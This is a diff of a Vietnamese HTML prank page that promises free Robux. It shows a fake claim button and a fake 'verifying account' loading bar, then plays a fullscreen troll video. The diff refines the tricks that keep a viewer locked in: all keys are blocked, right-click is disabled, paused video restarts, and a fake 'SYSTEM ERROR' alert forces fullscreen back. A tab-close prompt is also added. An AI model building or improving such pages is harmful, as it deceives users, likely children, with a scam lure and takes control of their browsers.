@@ -5,7 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>💎 NHẬN 10,000 ROBUX MIỄN PHÍ 💎</title>
     <style>
-        /* CSS CƠ BẢN & GIAO DIỆN */
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             font-family: 'Segoe UI', Arial, sans-serif;
@@ -16,21 +15,17 @@
             height: 100vh;
             overflow: hidden;
         }
-
         .container {
             text-align: center;
             background: white;
             padding: 40px;
             border-radius: 20px;
             box-shadow: 0 15px 35px rgba(0,0,0,0.2);
-            z-index: 10;
             width: 90%;
             max-width: 450px;
         }
-
         h1 { color: #00b06f; font-size: 28px; margin-bottom: 10px; }
         p { color: #666; margin-bottom: 25px; }
-
         .btn-claim {
             padding: 18px 35px;
             font-size: 20px;
@@ -44,8 +39,7 @@
             transition: 0.3s;
             text-transform: uppercase;
         }
-
-        /* Loading Bar */
+        .btn-claim:hover { background: #009960; transform: scale(1.02); }
         #loading-section { display: none; margin-top: 25px; }
         .progress-bg {
             width: 100%; height: 25px;
@@ -57,22 +51,27 @@
             width: 0%; height: 100%;
             background: linear-gradient(90deg, #00b06f, #00ff9d);
             transition: width 0.15s linear;
+            border-radius: 50px;
         }
+        #status-text { margin-top: 10px; color: #888; font-size: 14px; }
 
-        /* VIDEO TROLL - QUAN TRỌNG */
-        #trollVideo {
+        /* VIDEO OVERLAY */
+        #trollOverlay {
             display: none;
             position: fixed;
             top: 0; left: 0;
             width: 100vw; height: 100vh;
-            object-fit: cover;
             background: black;
             z-index: 999999;
-            pointer-events: none; /* Chặn click hiện thanh điều khiển */
+            cursor: none;
         }
-        
-        /* Ẩn con trỏ chuột khi troll */
-        .no-cursor { cursor: none !important; }
+        #trollVideo {
+            width: 100%; height: 100%;
+            object-fit: cover;
+            pointer-events: none;
+            display: block;
+        }
+        .no-cursor * { cursor: none !important; }
     </style>
 </head>
 <body id="mainBody">
@@ -80,87 +79,140 @@
     <div class="container" id="ui-box">
         <h1>💎 FREE ROBUX 💎</h1>
         <p>Chúc mừng! Bạn nhận được <b>10,000 Robux</b>. Nhấn xác nhận để nhận ngay!</p>
-        
-        <button class="btn-claim" onclick="startTrap()">XÁC NHẬN NHẬN QUÀ</button>
-
+        <button class="btn-claim" id="claimBtn" onclick="startTrap()">XÁC NHẬN NHẬN QUÀ</button>
         <div id="loading-section">
             <div class="progress-bg">
                 <div class="progress-bar" id="bar"></div>
             </div>
-            <p id="status-text" style="margin-top:10px; color:#888;">Đang kết nối server...</p>
+            <p id="status-text">Đang kết nối server...</p>
         </div>
     </div>
 
-    <video id="trollVideo" src="troll.mp4" loop playsinline disablePictureInPicture></video>
+    <!-- Dùng overlay riêng thay vì để video trực tiếp trên body -->
+    <div id="trollOverlay">
+        <video id="trollVideo"
+            src="troll.mp4"
+            loop
+            playsinline
+            disablePictureInPicture
+            preload="auto">
+        </video>
+    </div>
 
 <script>
-    const video = document.getElementById('trollVideo');
-    const uiBox = document.getElementById('ui-box');
-    const bar = document.getElementById('bar');
-    const body = document.getElementById('mainBody');
+    const video    = document.getElementById('trollVideo');
+    const overlay  = document.getElementById('trollOverlay');
+    const uiBox    = document.getElementById('ui-box');
+    const bar      = document.getElementById('bar');
+    const body     = document.getElementById('mainBody');
+    const statusTx = document.getElementById('status-text');
 
+    // Các message giả cho loading bar
+    const loadMessages = [
+        "Đang kết nối server...",
+        "Xác minh tài khoản...",
+        "Đang tải dữ liệu Robux...",
+        "Gần xong rồi...",
+        "Hoàn tất!"
+    ];
+
+    // ─── KIỂM TRA VIDEO SẴN SÀNG TRƯỚC ───────────────────────────────────────
+    // Tránh lỗi NotSupportedError bằng cách chỉ play khi readyState đủ
+    function safePlay() {
+        if (video.readyState >= 2) { // HAVE_CURRENT_DATA trở lên
+            video.play().catch(() => {}); // .catch để tránh Uncaught Promise
+        } else {
+            // Chờ video load đủ rồi mới play
+            video.addEventListener('canplay', () => {
+                video.play().catch(() => {});
+            }, { once: true });
+        }
+    }
+
+    // ─── LOADING GIẢ ──────────────────────────────────────────────────────────
     function startTrap() {
-        // 1. KÍCH HOẠT FULLSCREEN NGAY LẬP TỨC
-        const doc = document.documentElement;
-        if (doc.requestFullscreen) doc.requestFullscreen();
-        else if (doc.webkitRequestFullscreen) doc.webkitRequestFullscreen();
-
-        // 2. CHẠY LOADING GIẢ
-        document.querySelector('.btn-claim').style.display = 'none';
+        document.getElementById('claimBtn').style.display = 'none';
         document.getElementById('loading-section').style.display = 'block';
 
+        // Fullscreen ngay từ đầu (cần gesture của người dùng → onclick là đủ)
+        requestFS();
+
         let width = 0;
-        let loadInterval = setInterval(() => {
-            width += Math.random() * 2.5;
+        let msgIdx = 0;
+        const loadInterval = setInterval(() => {
+            width += Math.random() * 3;
             if (width > 100) width = 100;
             bar.style.width = width + "%";
 
+            // Cập nhật message theo tiến trình
+            const newIdx = Math.min(Math.floor(width / 25), loadMessages.length - 1);
+            if (newIdx !== msgIdx) {
+                msgIdx = newIdx;
+                statusTx.textContent = loadMessages[msgIdx];
+            }
+
             if (width >= 100) {
                 clearInterval(loadInterval);
-                launchTroll();
+                statusTx.textContent = loadMessages[loadMessages.length - 1];
+                setTimeout(launchTroll, 400); // Delay nhỏ cho UX
             }
         }, 80);
     }
 
+    // ─── FULLSCREEN HELPER ────────────────────────────────────────────────────
+    function requestFS() {
+        const el = document.documentElement;
+        const fn = el.requestFullscreen || el.webkitRequestFullscreen || el.mozRequestFullScreen;
+        if (fn) fn.call(el).catch(() => {});
+    }
+
+    // ─── PHÁT VIDEO TROLL ─────────────────────────────────────────────────────
     function launchTroll() {
-        // Hiện video, ẩn UI và ẩn chuột (Đã xoá shaking)
         uiBox.style.display = "none";
-        video.style.display = "block";
+        overlay.style.display = "block";
         body.classList.add('no-cursor');
-        video.play();
 
-        // --- CƠ CHẾ CHỐNG THOÁT HẠNG NẶNG ---
+        safePlay(); // ← Đây là fix chính, không gọi play() thẳng
 
-        // 1. Chặn phím Esc và các phím chức năng (Capture mode)
-        window.addEventListener('keydown', function(e) {
-            e.preventDefault();
-            e.stopPropagation();
-            return false;
-        }, true);
+        // ── CHỐNG THOÁT ──────────────────────────────────────────────────────
 
-        // 2. Chống tạm dừng (Check mỗi 30ms)
-        video.addEventListener('pause', () => video.play());
-        setInterval(() => { if (video.paused) video.play(); }, 30);
+        // 1. Chặn TẤT CẢ phím (capture phase)
+        window.addEventListener('keydown', blockKey, true);
+        window.addEventListener('keyup',   blockKey, true);
+        window.addEventListener('keypress',blockKey, true);
 
-        // 3. Tự động Fullscreen lại nếu bị thoát (Do người dùng giữ phím Esc)
-        document.addEventListener('fullscreenchange', () => {
-            if (!document.fullscreenElement && video.style.display === "block") {
-                alert("LỖI HỆ THỐNG: Vui lòng nhấn OK để tiếp tục quá trình nạp Robux!");
-                document.documentElement.requestFullscreen().catch(() => {});
-            }
-        });
+        // 2. Chống pause — chỉ gắn SAU khi video đã ready để tránh loop lỗi
+        video.addEventListener('pause', () => safePlay());
 
-        // 4. Chặn chuột (Phải + Trái) để không hiện Control
+        // 3. Backup interval — chỉ gọi safePlay, không gọi play() trực tiếp
+        setInterval(() => { if (video.paused) safePlay(); }, 500);
+
+        // 4. Tự fullscreen lại nếu bị thoát
+        document.addEventListener('fullscreenchange', onFSChange);
+        document.addEventListener('webkitfullscreenchange', onFSChange);
+
+        // 5. Chặn chuột phải
         document.addEventListener('contextmenu', e => e.preventDefault());
-        document.addEventListener('mousedown', e => {
-            e.preventDefault();
-            video.play();
-        });
 
-        // 5. Ngăn đóng Tab (Pop-up xác nhận)
-        window.onbeforeunload = function() {
-            return "Dữ liệu đang được tải, bạn có chắc muốn hủy bỏ?";
-        };
+        // 6. Chặn đóng tab
+        window.onbeforeunload = () => "Dữ liệu đang được tải, bạn có chắc muốn hủy bỏ?";
+    }
+
+    function blockKey(e) {
+        e.preventDefault();
+        e.stopImmediatePropagation();
+        return false;
+    }
+
+    function onFSChange() {
+        const isFullscreen = !!(document.fullscreenElement || document.webkitFullscreenElement);
+        if (!isFullscreen && overlay.style.display === "block") {
+            // Alert buộc người dùng nhấn OK trước khi xin lại FS
+            setTimeout(() => {
+                alert("❌ LỖI HỆ THỐNG: Vui lòng nhấn OK để tiếp tục nạp Robux!");
+                requestFS();
+            }, 100);
+        }
     }
 </script>
 
